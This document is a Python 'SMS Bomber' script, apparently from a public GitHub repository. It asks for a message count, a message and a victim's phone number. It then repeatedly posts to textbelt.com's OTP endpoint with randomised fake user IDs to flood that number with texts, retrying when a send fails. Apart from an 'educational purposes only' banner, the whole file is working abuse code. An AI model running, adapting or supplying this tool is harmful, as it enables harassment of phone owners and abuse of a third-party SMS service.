#!/usr/bin/python
# v1.0 by @linux_choice
# https://github.com/thelinuxchoice/smsbomber
# be original, do not copy this code!

import requests
from random import randint
import platform
import os
import signal
import time
import sys
if platform.system().lower() == "windows":
    os.system('color')

try:
    input = raw_input
except NameError:
    pass

def shutdown(signal, frame):
    print ('\n\033[1;31mCtrl+C was pressed, shutting down!\033[0m')
    sys.exit()

def main():

    print('\033[1;77m _____________  __________\033[1;93m_______                 ______ \033[0m')              
    print('\033[1;77m __  ___/__   |/  /_  ___/\033[1;93m__  __ )____________ ______  /______________ \033[0m')
    print('\033[1;77m _____ \__  /|_/ /_____ \ \033[1;93m__  __  |  __ \_  __ `__ \_  __ \  _ \_  ___/ \033[0m')
    print('\033[1;77m ____/ /_  /  / / ____/ /\033[1;93m _  /_/ // /_/ /  / / / / /  /_/ /  __/  /     \033[0m')
    print('\033[1;77m /____/ /_/  /_/  /____/ \033[1;31m /_____/ \____//_/ /_/ /_//_.___/\___//_/ \033[0m\033[1;77mv1.0      \033[0m')
    print('\n')
    print('\033[1;77mhttps://github.com/thelinuxchoice/smsbomber')
    print('\033[1;77mtwitter: @linux_choice')
    print('\033[1;31m[!] Legal disclaimer: Educational purposes only. Use only against your own number. Developers are not responsible for any damage caused by this program\033[0m\n')

    signal.signal(signal.SIGINT, shutdown)
    user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
    sess = requests.Session()
    counter=1
    try:
     total_sms=int(input('\033[1;77mTotal SMS: \033[0m'))
    except: #if total_sms == None:
      total_sms=3
    message=input('\033[1;77mMessage: \033[0m')
    if message == '':
       message='script kiddie on board'
    phone=input('\033[1;77mCountry Code + Phone: \033[0m')
    if phone == '':
       print('\033[1;31mPhone required.\033[0m')
       sys.exit()
    print('\033[1;93mStarting SMS Bomber, \033[0m\033[1;77mpress crtl + c to stop... \033[0m')
    time.sleep(3)
    while counter <= total_sms:
     r1=randint(0,999)
     r2=randint(100,9999)

     post_req = sess.post('https://textbelt.com/otp/generate', headers={ 'user-agent': user_agent}, data={

	'phone':'%s' % phone,
	'userid':'myuser{}@site{}.com'.format(r1,r2),
        'message':'%s' % message,
        'key':'textbelt'

     })

     #print(post_req.text) #debug

     if '"success":true' in post_req.text:
        print('\033[1;93mMessage\033[0m\033[1;77m %d/%d\033[0m \033[1;31mSent!\033[0m' % (counter,total_sms))
        counter+=1
     
     elif '"error":"Invalid phone number or bad request.' in post_req.text:
        print('\033[1;93mInvalid phone number or bad request. Exiting...\033[0m')
        sys.exit()
     else:
        print('Message %d not sent, trying again...' % counter)
     time.sleep(1)
if __name__ == '__main__':
    main()